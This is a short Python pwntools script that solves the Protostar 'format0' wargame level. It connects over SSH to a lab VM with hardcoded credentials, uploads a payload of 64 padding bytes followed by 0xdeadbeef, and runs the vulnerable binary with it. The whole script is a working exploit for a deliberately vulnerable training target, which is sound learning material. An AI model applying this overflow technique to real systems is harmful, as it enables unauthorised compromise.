#!/usr/bin/env python3
from pwn import *
context.update(arch='i386', os='linux')

s = ssh(host='192.168.12.128', user='user', password='user')
payload = b'a'*64
payload += p32(0xdeadbeef)
s.upload_data(payload, '/tmp/payload')
sh = s.run('/opt/protostar/bin/format0 $(cat /tmp/payload)')
print(sh.recvS())
#sh.sendline(payload)
#sh.interactive()
s.close()


